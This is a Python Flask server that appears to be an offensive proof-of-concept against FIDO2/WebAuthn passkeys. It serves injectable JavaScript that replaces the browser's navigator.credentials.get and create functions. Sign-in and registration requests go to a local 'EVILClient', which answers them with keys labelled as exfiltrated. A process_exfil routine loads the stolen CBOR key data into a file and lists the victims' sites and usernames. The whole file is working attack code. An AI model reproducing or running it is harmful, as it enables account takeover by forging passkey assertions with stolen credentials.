from flask import *
from flask_cors import CORS
import os
import base64
import json
import pickle
import requests
from fido2.client import *
from fido2.server import *
from fido2.webauthn import *
import sys
import os
import time

app = Flask(__name__)
CORS(app)

from EVIL_FIDO.EVIL_client import EVILClient

from windows_toasts import Toast, WindowsToaster
toaster = WindowsToaster('BIDO on FIDO')
newToast = Toast()

#currentclient=WindowsClient
currentclient=EVILClient

injectjs='''
const url = 'http://localhost:5000'

function bufferToArr(buf) {
	temparr = new Uint8Array(buf);
	arr = [];
	for (i = 0; i < temparr.length; i++) {
		arr.push(temparr[i]);
	}
	return arr;
}

function arrToBuffer(arr) {
	let array = Uint8Array.from(arr);
	return array.buffer;
}

function AuthenticatorAssertionResponse(authenticatorData, clientDataJSON, signature, userHandle) {
	this.authenticatorData = authenticatorData;
	this.clientDataJSON = clientDataJSON;
	this.signature = signature;
	this.userHandle = userHandle;
}

function AuthenticatorAttestationResponse(attestationObject, clientDataJSON)
{
	this.attestationObject=attestationObject;
	this.clientDataJSON=clientDataJSON;
}

class PublicKeyCredential {

	constructor(authenticatorAttachment, id, rawId, response, type) {
		this.authenticatorAttachment = authenticatorAttachment;
		this.id = id;
		this.rawId = rawId;
		this.response = response;
		this.type = type;
		this.clientExtensionResults={};
	}

	static async isConditionalMediationAvailable() {
		return false;
	}

	static async isUserVerifyingPlatformAuthenticatorAvailable() {
		return true;
	}

	getClientExtensionResults() {
		return {}
	}

}

var zzz;
var res1;
class cred {

	static async get(options) {
		console.log("Get called");
		console.log(options);
		const x = options;
		var rpid = encodeURIComponent(location.origin);
		zzz = options;
		var cred1;
		if('allowCredentials' in x['publicKey'])
		{
		cred1 = x['publicKey']['allowCredentials']
		}
		const chal = x['publicKey']['challenge']
		const len = cred1.length;
		var publicKey = {};
		var ac = [];
		cred1.forEach(credproc);
		console.log('ch1');
		function credproc(item) {
			try {
				var cr = {};
				cr['type'] = item['type']
				if ('transports' in item) {
					cr['transports'] = item['transports']
				}
				cr['id'] = bufferToArr(item['id']);
				ac.push(cr);
			} catch (err) {
				console.log(err);
			}
		}
		console.log('ch2');
		const challenge = bufferToArr(chal);
		var extensions = {};
		if ('extensions' in x['publicKey']) {
			const ext = x['publicKey']['extensions']
			if ('appid' in ext) {
				extensions['appid'] = ext['appid'];
			}
			publicKey['extensions'] = extensions;
		}
		const rpId = x['publicKey']['rpId'];
		const timeout = x['publicKey']['timeout'];
		const userVerification = x['publicKey']['userVerification'];
		publicKey['allowCredentials'] = ac;
		publicKey['challenge'] = challenge;
		publicKey['rpId'] = rpId;
		publicKey['timeout'] = timeout;
		publicKey['userVerification'] = userVerification;
		console.log('ch3');
		const tempdata = publicKey;
		console.log(tempdata);
		const response = await fetch(url + '/getoptions?site=' + rpid, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json'
			},
			body: JSON.stringify(tempdata)
		});
		const pkcred = await response.json();
		console.log(pkcred);
		res1 = pkcred;
		const reqresp = pkcred;
		const reqrespresp = reqresp['response'];
		var aresp = {};
		aresp['authenticatorData'] = arrToBuffer(reqrespresp['authenticatorData']);
		aresp['clientDataJSON'] = arrToBuffer(reqrespresp['clientDataJSON']);
		aresp['signature'] = arrToBuffer(reqrespresp['signature']);
		if ('userHandle' in reqrespresp){
		aresp['userHandle'] = arrToBuffer(reqrespresp['userHandle']);}
		const aresp1 = new AuthenticatorAssertionResponse(aresp['authenticatorData'], aresp['clientDataJSON'], aresp['signature']);
		var finresp = {};
		finresp['authenticatorAttachment'] = reqresp['authenticatorAttachment'];
		finresp['id'] = reqresp['id'];
		finresp['rawId'] = arrToBuffer(reqresp['rawId']);
		finresp['type'] = reqresp['type'];
		finresp['response'] = aresp;
		const finr = new PublicKeyCredential(finresp['authenticatorAttachment'], finresp['id'], finresp['rawId'], aresp1, finresp['type']);
		console.log(finr);
		return Promise.resolve(finr);
	}

	static async create(options) {
		console.log("create");
		console.log(options);
		var pk=options['publicKey']
		pk['challenge']=bufferToArr(pk['challenge'])
		pk['user']['id']=bufferToArr(pk['user']['id'])
		var rpid = encodeURIComponent(location.origin);
		console.log(pk);
		const response = await fetch(url + '/getcreate?site=' + rpid, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json'
			},
			body: JSON.stringify(pk)
		});
		
		
		const pkcred=await response.json();
		const reqresp = pkcred;
		const reqrespresp = reqresp['response'];
		var aresp = {};
		aresp['attestationObject'] = arrToBuffer(reqrespresp['attestationObject']);
		aresp['clientDataJSON'] = arrToBuffer(reqrespresp['clientDataJSON']);
		
		const aresp1 = new AuthenticatorAttestationResponse(aresp['attestationObject'], aresp['clientDataJSON']);
		
		var finresp = {};
		finresp['authenticatorAttachment'] = reqresp['authenticatorAttachment'];
		finresp['id'] = reqresp['id'];
		finresp['rawId'] = arrToBuffer(reqresp['rawId']);
		finresp['type'] = reqresp['type'];
		finresp['response'] = aresp;
		
		const finr = new PublicKeyCredential(finresp['authenticatorAttachment'], finresp['id'], finresp['rawId'], aresp1, finresp['type']);
		
		console.log(finr);
		return Promise.resolve(finr);


		
		
		
	}
}
navigator.credentials.get = cred.get;
navigator.credentials.create=cred.create;



'''


def readInject():
	global txt
	#fl=open('inject.js', 'r')
	#txt=fl.read()
	#fl.close()
	#pyperclip.copy(txt)
	txt=injectjs

def arrToBarr(arr):
	x=bytearray(len(arr))
	for i in range(len(arr)):
		x[i]=arr[i]
	return bytes(x)
	
def barrToArr(barr):
	arr=[x for x in barr]
	return arr	
	
def runauth(options, origin):
	print(options)
	chal=options['challenge']
	print(chal)
	rpid=options['rpId']
	print(rpid)
	client = currentclient(origin)
	#options, _ = server.authenticate_begin(user_verification='preferred')
	#options2=options['publicKey']
	print(options)
	result = client.get_assertion(options)
	result = result.get_response(0)
	print(result)
	
	credid=result.credential_id
	clntdata=result.client_data
	authdata=result.authenticator_data
	sign=result.signature
	tp=clntdata.type
	chal=clntdata.challenge
	chalb64=base64.urlsafe_b64encode(chal).decode()
	chalb64=chalb64.strip("=")
	orig=clntdata.origin
	clntDatarr=barrToArr(clntdata)
	rpidhash=authdata.rp_id_hash
	adat=barrToArr(rpidhash)
	adat.append(authdata.flags)
	counter=authdata.counter.to_bytes(4)
	for xx in counter:
		adat.append(xx)
	resp={}
	resp['authenticatorData']=adat
	resp['clientDataJSON']=clntDatarr
	resp['signature']=barrToArr(sign)
	if (result.user_handle):
		resp['userHandle']=barrToArr(result.user_handle)
	#print(sign)
	pkcred={}
	pkcred['authenticatorAttachment']='platform'
	pkcred['rawId']=barrToArr(credid)
	pkcred['id']=base64.urlsafe_b64encode(credid).decode().strip("=")
	pkcred['type']='public-key'
	pkcred['response']=resp
	return pkcred
	
def runcreate(options, site):
	client=currentclient(site)
	result=client.make_credential(options['publicKey'])
	print(result)

	clntdata=result.client_data
	credid=result.attestation_object.auth_data.credential_data.credential_id

	clntDatarr=barrToArr(clntdata)
	
	attobb=result.attestation_object
	attobbarr=barrToArr(attobb)
	
	resp={}
	resp['attestationObject']=attobbarr
	resp['clientDataJSON']=clntDatarr
	
	pkcred={}
	pkcred['authenticatorAttachment']='platform'
	pkcred['rawId']=barrToArr(credid)
	pkcred['id']=base64.urlsafe_b64encode(credid).decode().strip("=")
	pkcred['type']='public-key'
	pkcred['response']=resp
	return pkcred

	

def makeOptions(opt):
	#print(opt)
	options={}
	options['challenge']=arrToBarr(opt['challenge'])
	options['rpId']='example.com'

	if 'rpId' in opt and opt['rpId'] is not None:
		options['rpId']=opt['rpId']
	if 'timeout' in opt:
		options['timeout']=opt['timeout']
	if 'userVerification' in opt:	
		options['userVerification']=opt['userVerification']
	if 'extensions' in opt:
		options['extensions']=opt['extensions']
	ac=[]
	for zz in opt['allowCredentials']:
		cred={}
		cred['type']=zz['type']
		cred['id']=arrToBarr(zz['id'])
		if 'transports' in zz:
			cred['transports']=zz['transports']
		ac.append(cred)
	options['allowCredentials']=ac
	return options		

def makeCreateOptions(opt):
	options=opt
	options['challenge']=arrToBarr(opt['challenge'])
	options['user']['id']=arrToBarr(opt['user']['id'])
	acr=AuthenticatorSelectionCriteria(authenticator_attachment='platform', resident_key='preferred', user_verification='preferred')
	att=None
	if 'attestation' in options and options['attestation']:
		att=options['attestation']
	
	ext=None
	if 'extensions' in options and options['extensions']:
		ext=options['extensions']
	
	op=CredentialCreationOptions(
		PublicKeyCredentialCreationOptions(
			rp=options['rp'],
			user=options['user'],
			challenge=options['challenge'],
			pub_key_cred_params=options['pubKeyCredParams'],
			authenticator_selection=acr,
			attestation=att,
			extensions=ext,
					
			
		),
	)
	return op		

@app.route("/", methods=["GET","POST"])
def index():
	return "active"
		
@app.route("/getoptions", methods=["GET","POST"])
def getoptions():
	opt= request.json
	url=request.args.get('site')
	options=makeOptions(opt);
	print(options)
	resp1=runauth(options, url)
	res1=resp1
	
	return jsonify(res1)
	
@app.route("/getcreate", methods=["GET","POST"])
def getcreate():
	opt= request.json
	url=request.args.get('site')
	options=makeCreateOptions(opt)
	print(options)
	pkcred=runcreate(options, url)
	return jsonify(pkcred)
	
@app.route("/get_script", methods=["GET","POST"])
def get_script():
	global txt
	return txt

def process_exfil():
	data=input("Enter exfiltrated data (or press 'c' to use previously exfiltrated data): ")
	data=data.strip()
	if data=='c':
		return
	file=open('keys.secret', 'wb')
	import base64
	databin=base64.urlsafe_b64decode(data)
	file.write(databin)
	file.close()
	import cbor2
	keys=cbor2.loads(databin)
	print()
	print()
	print("Exfiltrated data:")
	for rp in keys:
		for cred in keys[rp]:
			print(rp,' ', keys[rp][cred]['userentity']['name'])
	
		
if __name__=="__main__":
	readInject()
	process_exfil()
	app.run(host="0.0.0.0", port=5000)
